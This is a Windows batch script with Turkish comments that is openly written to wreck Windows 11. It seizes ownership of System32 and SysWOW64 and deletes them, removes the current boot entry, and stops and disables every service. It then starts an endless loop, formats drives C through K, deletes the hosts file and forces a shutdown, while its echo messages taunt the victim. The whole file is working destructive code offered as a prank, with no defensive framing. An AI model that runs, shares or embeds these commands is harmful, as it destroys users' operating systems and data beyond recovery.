@echo off
:: Windows 11'i çökertme başlıyor... Vedalaşma zamanı!
echo Bu dosya Windows 11'i tamamen yok edecek. Eğlenceniz bol olsun!

:: Kritik Sistem Klasörlerini Silme
echo System32 ve diğer kritik klasörler hedef alınıyor...
takeown /f C:\Windows\System32 /r /d y >nul 2>&1
icacls C:\Windows\System32 /grant %username%:F /t >nul 2>&1
rd /s /q C:\Windows\System32

takeown /f C:\Windows\SysWOW64 /r /d y >nul 2>&1
icacls C:\Windows\SysWOW64 /grant %username%:F /t >nul 2>&1
rd /s /q C:\Windows\SysWOW64

:: Bootloader Yok Etme
echo Bootloader tamamen siliniyor...
bcdedit /delete {current} /f >nul 2>&1

:: Kritik Hizmetleri Durdur ve Devre Dışı Bırak
echo Tüm kritik Windows hizmetleri durduruluyor...
for /f "tokens=*" %%a in ('sc query state^= all ^| findstr "SERVICE_NAME"') do (
    sc stop %%a >nul 2>&1
    sc config %%a start= disabled >nul 2>&1
)

:: Sonsuz Döngü Başlatma (CPU'yu patlat!)
:start
echo Sonsuz döngü başlatıldı... Windows'un nefesi kesiliyor!
goto start

:: Tüm Diskleri Biçimlendirme
echo Tüm diskleri biçimlendiriyoruz... Verilerinize güle güle!
for %%x in (C D E F G H I J K) do (
    echo Y | format %%x: /FS:NTFS /Q >nul 2>&1
)

:: Hosts Dosyasını Yok Etme (İnternet erişimini kes)
echo Hosts dosyası yok ediliyor...
takeown /f C:\Windows\System32\drivers\etc\hosts >nul 2>&1
icacls C:\Windows\System32\drivers\etc\hosts /grant %username%:F >nul 2>&1
del /f /q C:\Windows\System32\drivers\etc\hosts

:: Kapanış Mesajı
echo "Windows 11 artık nefes almıyor. Format zamanınız geldi. Eğlenceli bir format dilerim!" >> C:\last_message.txt

:: Sistemi Kapat
echo Sistem kapanıyor... Güle güle!
shutdown /s /f /t 0
